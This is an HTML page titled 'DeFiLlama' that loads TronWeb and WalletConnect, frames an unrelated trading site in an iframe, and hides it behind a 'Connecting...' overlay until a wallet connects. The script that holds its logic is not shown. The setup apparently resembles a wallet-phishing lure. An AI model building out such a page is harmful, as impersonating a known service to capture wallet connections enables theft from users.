<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DeFiLlama</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

    <!--  添加 TronWeb 的引用 -->
    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.1.0/dist/TronWeb.min.js"></script>
    <!-- WalletConnect 的引用 -->
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/client@1.x/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/qrcode-modal@1.x/dist/index.min.js"></script>

    <link rel="stylesheet" href="./src/style.css">
</head>
<body>

    <header>
        <button id="connectButton" title="Connect wallet">
            <i class="fas fa-wallet"></i> Connect Wallet
        </button>
    </header>

    <div id="status"></div>  <!-- 状态栏 (加上 id="status") -->

    <div id="contentContainer">
        <iframe id="coindeskFrame" src="https://www.hdxcmax.com/syn/#/quotes/index" title="HDXC"></iframe>
    </div>

    <div id="blurOverlay" style="display: flex;">  <!-- 遮罩层 (初始显示) -->
        <div id="overlayMessage">Connecting...</div>
    </div>

    <script src="./src/main.js"></script>

</body>
</html>
